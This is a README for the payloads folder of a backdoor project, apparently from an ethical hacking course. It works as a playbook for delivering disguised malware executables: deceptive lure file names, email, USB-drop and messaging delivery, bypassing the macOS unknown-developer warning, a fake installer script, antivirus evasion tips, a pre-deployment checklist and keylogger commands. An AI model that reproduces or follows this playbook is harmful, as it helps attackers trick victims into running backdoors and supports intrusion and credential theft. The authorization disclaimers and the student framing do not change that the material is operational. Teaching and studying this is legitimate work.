# Payloads Directory

This directory contains the **generated executable malware files** ready for deployment.

## üì¶ What's Here

After running `build_executable.py`, you'll find:

```
payloads/
‚îú‚îÄ‚îÄ SecurityUpdate.exe      # Windows executable
‚îú‚îÄ‚îÄ SystemUpdate.app/       # macOS application bundle
‚îî‚îÄ‚îÄ system-update           # Linux binary
```

## üöÄ Quick Deployment Guide

### Windows (.exe)

**File**: `SecurityUpdate.exe`

**How to Deploy:**

1. Rename for social engineering:

   ```bash
   cp SecurityUpdate.exe CompanyPolicy.exe
   ```

2. Send to target via:

   - üìß Email attachment
   - üíæ USB drive
   - üí¨ Messaging (Discord, Slack, Teams)
   - üåê File sharing (Dropbox, Drive)

3. Target action:
   - Double-click ‚Üí Runs automatically!
   - No visible window
   - Silent connection back to you

**File Size**: ~8-15 MB

**Compression** (for email):

```bash
zip SecurityUpdate.zip SecurityUpdate.exe
# Reduces to ~5 MB
```

---

### macOS (.app)

**File**: `SystemUpdate.app` (folder/bundle)

**‚ö†Ô∏è Important**: Always compress before sending!

**How to Deploy:**

1. Compress first (required):

   ```bash
   zip -r SystemUpdate.zip SystemUpdate.app
   ```

2. Optional rename:

   ```bash
   mv SystemUpdate.app DocumentViewer.app
   zip -r DocumentViewer.zip DocumentViewer.app
   ```

3. Send `SystemUpdate.zip` to target

4. Target action:
   - Extract .zip file
   - Double-click .app
   - May see "unknown developer" warning
   - Right-click ‚Üí Open to bypass
   - Silent execution!

**File Size**: ~10-20 MB (folder), ~5-8 MB (zipped)

---

### Linux Binary

**File**: `system-update`

**How to Deploy:**

1. Rename for stealth:

   ```bash
   cp system-update apt-update
   # or
   cp system-update network-tool
   ```

2. Create installer script:

   ```bash
   echo '#!/bin/bash' > install.sh
   echo 'echo "Installing updates..."' >> install.sh
   echo './system-update &' >> install.sh
   echo 'echo "Complete!"' >> install.sh
   chmod +x install.sh
   ```

3. Send both files or just binary

4. Target action:
   - Make executable: `chmod +x system-update`
   - Run: `./system-update` (or `./install.sh`)
   - Runs in background

**File Size**: ~8-15 MB

**Packaging**:

```bash
tar -czf update-tool.tar.gz system-update install.sh
```

---

## üé≠ Renaming Suggestions

### Windows

```
SecurityUpdate.exe ‚Üí CompanyPolicy2025.exe
SecurityUpdate.exe ‚Üí HR_Salaries_Q4.exe
SecurityUpdate.exe ‚Üí NetworkScanner.exe
SecurityUpdate.exe ‚Üí PerformanceOptimizer.exe
SecurityUpdate.exe ‚Üí SystemDiagnostic.exe
```

### macOS

```
SystemUpdate.app ‚Üí DocumentReader.app
SystemUpdate.app ‚Üí PDFViewer.app
SystemUpdate.app ‚Üí SecurityPatch.app
SystemUpdate.app ‚Üí SystemOptimizer.app
```

### Linux

```
system-update ‚Üí apt-updater
system-update ‚Üí network-scanner
system-update ‚Üí sys-diagnostic
system-update ‚Üí package-installer
```

---

## üìã Pre-Deployment Checklist

Before sending to target:

- [ ] **Server is running**: `python3 ../server.py` in another terminal
- [ ] **Correct IP**: Payload was built with reachable IP address
- [ ] **Firewall open**: Port 5555 (or your port) is accessible
- [ ] **File renamed**: Changed to something innocent/relevant
- [ ] **Tested in VM**: Verified it works in safe environment
- [ ] **Story ready**: Have convincing social engineering pretext
- [ ] **Authorization**: You have permission to test this target
- [ ] **Compressed**: (For macOS or large email attachments)
- [ ] **Icon checked**: Using appropriate icon (if customized)
- [ ] **Backup plan**: Know how to clean up if detected

---

## üß™ Testing Before Deployment

**Always test first!**

### 1. Start Server

```bash
cd /Users/kaweewatnoisuwan/Desktop/DES484_Backdoor
python3 server.py
```

### 2. Copy to Test VM

```bash
# Windows VM
scp SecurityUpdate.exe user@windows-vm:~/Desktop/

# macOS VM
scp -r SystemUpdate.app user@mac-vm:~/Desktop/

# Linux VM
scp system-update user@linux-vm:~/
```

### 3. Execute on VM

- Windows: Double-click `SecurityUpdate.exe`
- macOS: Double-click `SystemUpdate.app`
- Linux: `chmod +x system-update && ./system-update`

### 4. Verify Connection

Check server terminal for:

```
[+] Connection established from [VM_IP]:[PORT]
```

### 5. Test Commands

```bash
[VM_IP]> help_advanced
[VM_IP]> sysinfo
[VM_IP]> keylog_start
```

---

## üìä File Information

| File               | Type         | Size      | Platform     | Python Required? |
| ------------------ | ------------ | --------- | ------------ | ---------------- |
| SecurityUpdate.exe | Windows PE   | ~8-15 MB  | Windows 7+   | ‚ùå No            |
| SystemUpdate.app   | macOS Bundle | ~10-20 MB | macOS 10.12+ | ‚ùå No            |
| system-update      | ELF Binary   | ~8-15 MB  | Linux (x64)  | ‚ùå No            |

---

## üéØ Deployment Methods by Platform

### Windows

**Best Methods:**

1. Email with PDF icon
2. USB drop attack
3. Fake software download
4. Shared network folder

**Success Rate**: High (users double-click easily)

### macOS

**Best Methods:**

1. Email with .zip attachment
2. Fake DMG installer
3. Messaging apps
4. iCloud/AirDrop

**Success Rate**: Medium (Gatekeeper warnings)

### Linux

**Best Methods:**

1. Package repository exploit
2. Fake installer script
3. Technical user social engineering
4. Disguised as system tool

**Success Rate**: Lower (users more technical)

---

## üõ°Ô∏è Detection & Evasion

### Will Antivirus Detect?

**Likely**: Yes, for several reasons:

- PyInstaller signatures known
- Behavioral analysis (network connections)
- Heuristic detection

### Evasion Tips (Educational)

**For Authorized Tests:**

1. Request AV exception before deployment
2. Use on air-gapped systems
3. Focus on user awareness (weakest link)

**For Learning:**

1. Obfuscate before building (PyArmor)
2. Use different packers (Nuitka, cx_Freeze)
3. Sign with certificate
4. Add legitimate functionality
5. Delay execution
6. Environmental checks

---

## üßπ Cleanup After Testing

### On Target Machine

**Find and Kill Process:**

```bash
# Windows
tasklist | findstr python
taskkill /F /PID [PID]

# macOS/Linux
ps aux | grep python
kill -9 [PID]
```

**Remove Installation:**

```bash
# Windows
del /F /Q %USERPROFILE%\.system_update

# macOS/Linux
rm -rf ~/.system_update
rm -rf ~/.config/systemd
rm -rf ~/.local/share/system
```

**Remove Executable:**

```bash
# Windows
del SecurityUpdate.exe

# macOS
rm -rf SystemUpdate.app

# Linux
rm system-update
```

---

## ‚ö†Ô∏è Important Warnings

### Legal

- ‚úÖ Only deploy with **written authorization**
- ‚úÖ Use for **educational purposes** only
- ‚ùå **Unauthorized access is ILLEGAL**
- ‚ùå Can result in **prosecution**

### Ethical

- Always get permission first
- Document all activities
- Report findings responsibly
- Help improve security
- Never cause harm

### Technical

- Test thoroughly before deployment
- Have cleanup plan ready
- Monitor for detection
- Be ready to stop if issues arise

---

## üìû Quick Reference

### To Rebuild

```bash
cd ..
python3 build_executable.py [IP] [PORT] [PLATFORM]
```

### To Test

```bash
# Start server
cd ../..
python3 server.py

# Deploy to VM and execute
```

### To Clean

```bash
# Remove all payloads
cd payloads
rm -rf *
```

---

## üéì For Students

**Assignment Deliverables:**

1. ‚úÖ Screenshot of successful build
2. ‚úÖ Screenshot of file in payloads/ directory
3. ‚úÖ Screenshot of deployment to test VM
4. ‚úÖ Screenshot of established connection
5. ‚úÖ Documentation of attack process
6. ‚úÖ Analysis of detection methods
7. ‚úÖ Remediation recommendations

**Tips:**

- Test with Windows VM first (easiest)
- Try different file names
- Document what works and doesn't
- Analyze network traffic with Wireshark
- Compare detection rates across AVs

---

**Remember**: These are powerful tools. Use responsibly and ethically!

---

_For SIIT DES484 Ethical Hacking Course - Educational Use Only_
